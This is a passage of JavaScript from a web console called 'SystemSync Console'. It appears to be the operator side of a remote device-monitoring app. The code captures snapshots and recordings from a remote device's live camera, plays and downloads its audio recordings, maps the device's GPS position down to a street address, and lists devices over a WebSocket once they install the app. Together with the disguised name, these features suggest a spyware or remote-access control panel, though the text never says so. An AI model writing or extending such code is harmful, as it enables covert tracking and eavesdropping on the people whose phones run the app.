            statusEl.style.background = '#ffebee';
            statusEl.style.color = '#c62828';
        }
    }

    function takeSnapshot() {
        const video = document.getElementById('liveCamVideo');
        if (!video || !video.videoWidth) {
            alert('No live video or video not ready');
            return;
        }
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `snapshot_${Date.now()}.png`;
            a.click();
            URL.revokeObjectURL(url);
            logActivity('Live snapshot taken');
        }, 'image/png');
    }

    function toggleRecording() {
        const video = document.getElementById('liveCamVideo');
        if (!video || !video.srcObject) {
            alert('No live stream');
            return;
        }
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            document.getElementById('recordBtn').innerText = 'Record Video';
            logActivity('Live video recording stopped');
        } else {
            recordedChunks = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const stream = video.srcObject;

            if (video.videoWidth === 0) {
                video.onloadedmetadata = () => startCanvasRecording(video, canvas, ctx, stream);
            } else {
                startCanvasRecording(video, canvas, ctx, stream);
            }
            logActivity('Live video recording started');
        }
    }

    function startCanvasRecording(video, canvas, ctx, originalStream) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        function drawVideoFrame() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            requestAnimationFrame(drawVideoFrame);
        }
        drawVideoFrame();

        const canvasStream = canvas.captureStream(30);
        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

        mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
        mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `recording_${Date.now()}.webm`;
            a.click();
            URL.revokeObjectURL(url);
            canvasStream.getTracks().forEach(track => track.stop());
            logActivity('Live video recording saved');
        };
        mediaRecorder.start();
        document.getElementById('recordBtn').innerText = 'Stop Recording';
    }

    function showAudio(base64) {
        panel.innerHTML = `
            <audio controls src="data:audio/3gp;base64,${base64}"></audio>
            <button onclick="downloadBase64('${base64}', 'recording.3gp')">Download</button>
        `;
    }

    function downloadBase64(b64, filename) {
        try {
            const byteCharacters = atob(b64);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            const blob = new Blob([byteArray], { type: 'application/octet-stream' });
            
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            console.log('Downloaded:', filename);
            showNotification(`Downloaded: ${filename}`);
        } catch (e) {
            console.error('Download error:', e);
            try {
                const a = document.createElement('a');
                a.href = 'data:application/octet-stream;base64,' + b64;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                showNotification(`Downloaded: ${filename}`);
            } catch (e2) {
                console.error('Fallback download error:', e2);
                alert('Download failed: ' + e.message);
            }
        }
    }

    function renderMap(loc) {
        if (!loc || typeof loc.lat !== 'number' || typeof loc.lon !== 'number') {
            panel.innerHTML = '<p>Invalid location data</p>';
            return;
        }

        panel.innerHTML = '<div id="map" style="position:relative;"></div>';
        const mapDiv = document.getElementById('map');

        const infoDiv = document.createElement('div');
        infoDiv.className = 'map-info';
        infoDiv.innerHTML = `
            <div class="coord">📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
            <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
            <div>📡 Provider: ${loc.provider || 'unknown'}</div>
            <div class="addr">🌍 Loading address...</div>
        `;
        mapDiv.appendChild(infoDiv);

        if (mapInstance) mapInstance.remove();
        mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
        L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);

        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
        })
        .then(response => response.json())
        .then(data => {
            const address = data.display_name || 'Address not found';
            infoDiv.querySelector('.addr').innerHTML = `🌍 ${address}`;
        })
        .catch(err => {
            console.error('Geocoding error:', err);
            infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
        });
    }

    function connectWebSocket() {
        if (ws) {
            ws.close();
        }
        setStatus('CONNECTING');
        ws = new WebSocket(WS_URL);
        ws.onopen = () => {
            console.log('WebSocket connected');
            ws.send('I_AM_WEB');
            setStatus('CONNECTED');
            window._reconnectDelay = 3000;
            logActivity('WebSocket connected');

            const welcomeMsg = document.getElementById('welcomeMessage');
            if (welcomeMsg) {
                welcomeMsg.innerHTML = `
                    <h2>👋 Welcome to SystemSync Console</h2>
                    <p>Waiting for devices to connect...</p>
                    <p>When a device installs the app, it will appear in the dropdown menu above.</p>
                `;
                welcomeMsg.style.display = 'block';
            }

            ws.send(JSON.stringify({ type: 'GET_DEVICES' }));

            if (window.deviceListInterval) clearInterval(window.deviceListInterval);
            window.deviceListInterval = setInterval(() => {
                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ type: 'GET_DEVICES' }));
                }
            }, 30000);
        };
        ws.onmessage = (e) => {
            console.log('RAW message:', e.data);
            handleIncomingMessage(e.data);
        };
        ws.onclose = () => {
            console.log('WebSocket closed');
            setStatus('OFFLINE');
            ws = null;
            if (window.deviceListInterval) clearInterval(window.deviceListInterval);
            logActivity('WebSocket disconnected');
            const delay = Math.min(30000, (window._reconnectDelay || 3000));
            window._reconnectDelay = delay * 2;
            console.log(`Reconnecting in ${delay}ms...`);
            setTimeout(() => {
                if (!ws) connectWebSocket();
            }, delay);
        };
        ws.onerror = (err) => {
            console.error('WebSocket error:', err);
            setStatus('ERROR');
        };
    }
